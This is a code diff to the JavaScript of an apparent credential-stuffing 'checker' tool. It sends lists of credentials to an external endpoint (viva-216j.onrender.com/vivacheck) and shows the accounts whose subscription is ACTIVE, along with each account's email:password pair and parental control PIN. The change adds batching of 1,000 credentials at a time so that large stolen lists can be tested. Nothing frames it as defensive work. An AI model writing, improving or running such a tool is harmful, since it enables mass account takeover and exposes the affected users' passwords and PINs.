@@ -1,4 +1,3 @@
-
 document.addEventListener('DOMContentLoaded', function () {
     var checkBtn = document.getElementById("checkBtn");
     checkBtn.addEventListener('click', async function () {
@@ -7,24 +6,32 @@ document.addEventListener('DOMContentLoaded', function () {
         const hitsOutput = document.getElementById('hitsOutputs');
         hitsOutput.innerHTML = '';
 
-        try {
-            const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
-            const responses = await Promise.all(requests);
+        const batchSize = 1000;
+        const totalBatches = Math.ceil(credentials.length / batchSize);
 
+        try {
             let hitCount = 0;
-            responses.forEach(response => {
-                // console.log(response.data, response.data?.subscriptionStatus.toUpperCase());
-                if (response.data?.subscriptionStatus?.toUpperCase() === 'ACTIVE') {
-                    hitCount++;
-                    hitsOutput.innerHTML += `
-                        <div class="card mx-auto">
-                            <div class="card-body text-center">
-                                ${response.data.emeylpassword} - ${response.data.subscriptionStatus} - ${response.data.parentalControlPin}
+            for (let i = 0; i < totalBatches; i++) {
+                const startIndex = i * batchSize;
+                const endIndex = Math.min(startIndex + batchSize, credentials.length);
+                const batchCredentials = credentials.slice(startIndex, endIndex);
+
+                const requests = batchCredentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
+                const responses = await Promise.all(requests);
+
+                responses.forEach(response => {
+                    if (response.data?.subscriptionStatus?.toUpperCase() === 'ACTIVE') {
+                        hitCount++;
+                        hitsOutput.innerHTML += `
+                            <div class="card mx-auto">
+                                <div class="card-body text-center">
+                                    ${response.data.emeylpassword} - ${response.data.subscriptionStatus} - ${response.data.parentalControlPin}
+                                </div>
                             </div>
-                        </div>
-                    `
-                }
-            });
+                        `;
+                    }
+                });
+            }
 
             if (hitCount === 0) {
                 hitsOutput.innerHTML = 'No active subscriptions found.';
